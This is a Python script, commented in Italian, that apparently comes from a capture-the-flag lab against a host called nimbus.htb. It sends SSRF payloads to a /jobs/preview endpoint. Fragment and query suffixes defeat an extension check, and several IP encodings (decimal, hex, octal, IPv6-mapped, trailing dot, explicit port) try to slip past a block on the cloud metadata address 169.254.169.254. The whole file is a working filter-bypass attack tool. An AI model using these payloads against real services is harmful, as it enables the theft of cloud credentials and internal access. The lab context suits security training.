#!/usr/bin/env python3
"""
Sonda il filtro SSRF di Nimbus: prova tanti payload contro /jobs/preview
e per ognuno stampa lo status / l'esito (bloccato, fetchato, errore).

Uso:  python3 probe.py
"""
import re
import sys
import urllib.parse
import urllib.request

ENDPOINT = "http://nimbus.htb/jobs/preview"

# Ora ogni payload finisce "in .yaml" via fragment (#.yaml) o query (?x=.yaml)
# per superare il check estensione, e testiamo il SECONDO filtro (metadata block).
META = "/latest/meta-data/"
HOSTS = [
    ("nimbus.htb",      "/"),                 # baseline consentito (conferma il trucco suffisso)
    ("169.254.169.254", META),               # diretto -> tests filtro metadata
    ("127.0.0.1",       "/"),                # localhost
    ("2852039166",      META),               # decimale
    ("0xA9FEA9FE",      META),               # hex intero
    ("0xA9.0xFE.0xA9.0xFE", META),           # hex per ottetto
    ("0251.0376.0251.0376", META),           # ottale
    ("[::ffff:169.254.169.254]", META),      # IPv6-mapped
    ("169.254.169.254.", META),              # dot finale
    ("169.254.169.254:80", META),            # porta esplicita
]

PAYLOADS = []
for host, path in HOSTS:
    base = f"http://{host}{path}"
    PAYLOADS.append(base + "#.yaml")     # fragment: NON inviato al server
    PAYLOADS.append(base + "?x=.yaml")   # query: ignorata dal metadata server


def visible_text(html):
    # Tieni solo il <body>, togli style/script, strippa i tag, normalizza spazi
    body = re.search(r"<body>(.*?)</body>", html, re.S)
    h = body.group(1) if body else html
    h = re.sub(r"<(style|script).*?</\1>", " ", h, flags=re.S)
    h = re.sub(r"<[^>]+>", " ", h)
    h = h.replace("&middot;", "·").replace("&#183;", "·")
    h = re.sub(r"&#34;", '"', h).replace("&#39;", "'")
    return re.sub(r"\s+", " ", h).strip()


def probe(url):
    data = urllib.parse.urlencode({"url": url}).encode()
    req = urllib.request.Request(ENDPOINT, data=data, method="POST")
    try:
        with urllib.request.urlopen(req, timeout=15) as r:
            body = r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        body = e.read().decode("utf-8", "replace")
    except Exception as e:
        return f"ERR conn: {e}"
    txt = visible_text(body)
    # Togli la parte di navigazione iniziale fissa
    txt = txt.replace("Preview ← submit another", "").strip()
    return txt[:350]


def main():
    print(f"[*] Sonda {ENDPOINT}\n")
    for p in PAYLOADS:
        print(f"{p}")
        print(f"    {probe(p)}")
        print()


if __name__ == "__main__":
    main()
